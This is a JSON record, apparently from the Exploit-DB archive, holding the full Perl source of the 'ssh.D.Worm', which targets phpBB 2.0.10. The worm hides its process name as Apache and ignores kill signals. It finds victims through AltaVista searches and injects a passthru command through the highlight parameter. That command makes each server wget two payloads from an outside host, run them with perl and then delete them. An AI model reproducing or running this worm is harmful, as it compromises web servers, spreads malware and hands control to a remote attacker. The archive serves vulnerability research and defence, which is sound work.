{
  "id": "740",
  "title": "phpBB 2.0.10 - &#039;ssh.D.Worm&#039; Bot Install Altavista",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n\r\n################################################################################\r\n#  ------------------------------------------------------------------------    #\r\n#  Severino Honorato - /server irc.priv8crew.info #Priv8crew - ssh.D.Worm      #\r\n#                                                                              #\r\n################################################################################\r\n\r\n\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\nmy $processo = \"/usr/local/apache/bin/httpd -DSSL\";\r\n$SIG{\"INT\"} = \"IGNORE\";\r\n$SIG{\"HUP\"} = \"IGNORE\";\r\n$SIG{\"TERM\"} = \"IGNORE\";\r\n$SIG{\"CHLD\"} = \"IGNORE\";\r\n$SIG{\"PS\"} = \"IGNORE\";\r\n\r\n$0=\"$processo\".\"\\0\"x16;;\r\nmy $pid=fork;\r\nexit if $pid;\r\ndie \"Problema com o fork: $!\" unless defined($pid);\r\n\r\nwhile(1){\r\n@vul = \"\";\r\n$a=0;\r\n$numero = int rand(999);\r\n$procura = \"topic.php?t=$numero\";\r\n\r\n######################################\r\nfor($n=0;$n<1111;$n += 10){\r\n\r\n  @cade = get(\"http://www.altavista.com/web/results?itag=wrx&q=$procura&kgs=1&kls=0&stq=$n\") or next;\r\n  $ae = \"@cade\";\r\n  #print $ae;\r\n  while ($ae=~ m/<a class=\\'res\\' href=\\'.*?\\'>/){\r\n    $ae=~ s/<a class=\\'res\\' href=\\'(.*?)\\'>/$1/;\r\n    $uber=$1;\r\n\r\n    $uber =~ s/ //g;\r\n    $uber =~ s/<b>//g;\r\n    $uber =~ s/<\\/b>//g;\r\n    $uber =~ s/<wbr>//g;\r\n\r\n    if ($uber =~/&/){\r\n      $nu = index $uber, '&';\r\n      $uber = substr($uber,0,$nu);\r\n    }\r\n    $vul[$a] = $uber;\r\n    $a++\r\n  }\r\n}\r\n\r\n#########################\r\n\r\n\r\n$cmd = \"&rush=%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20cd /tmp;wget \r\natlasol.com/.zk/sess_189f0f0889555397a4de5485dd611111;wget atlasol.com/.zk/sess_189f0f0889555397a4de5485dd611112;perl \r\nsess_189f0f0889555397a4de5485dd611112;rm sess_189f0f0889555397a4de5485dd611112;perl \r\nsess_189f0f0889555397a4de5485dd611111;rm \r\nsess_189f0f0889555397a4de5485dd611111%3B%20%65%63%68%6F%20%5F%45%4E%44%5F&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5F%47%45%54%5F%56%41%52%53%5B%72%75%73%68%5D%29.%2527';\";\r\n\r\n$b = scalar(@vul);\r\n\r\nfor($a=0;$a<=$b;$a++)\r\n{\r\n$sitevul = $vul[$a] . $cmd;\r\nif($sitevul !~/http/){ $sitevul = 'http://' . $sitevul; }\r\n\r\n$teste1 = get($sitevul) or next;\r\n$teste1 = \"\";\r\n}\r\n}\r\n\r\n# milw0rm.com [2005-01-04]",
  "url": "https://www.exploit-db.com/exploits/740"
}